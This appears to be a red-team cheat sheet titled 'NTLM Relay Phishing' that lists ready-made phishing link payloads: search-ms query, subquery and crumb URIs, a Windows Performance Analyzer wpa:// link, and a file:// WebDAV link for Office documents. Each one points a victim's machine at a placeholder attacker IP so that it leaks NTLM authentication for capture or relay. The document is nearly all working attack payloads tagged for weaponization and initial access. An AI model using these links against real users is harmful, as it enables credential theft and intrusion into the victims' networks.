---
author(s):
  - Userware
tags:
  - helpers
  - initial-access
  - weaponization
  - sniffing-and-spoofing
  - ntlm
  - relay
  - phishing
  - network-protocols
  - smb
---
# NTLM Relay Phishing

## 01 - MSQuery

```
search-ms://query=<anything>&subquery=\\<attacker_IP>\<anything>.search-ms

search-ms://query=<anything>&crumb=location:\\<attacker_IP>\<anything>
```

## 02 - Windows Performance Analyzer

```
wpa:////<attacker_IP>/<anything>
```

## 03 - LibreOffice and Microsoft Office

WebDAV link.

```
file://<attacker_IP>/snare
```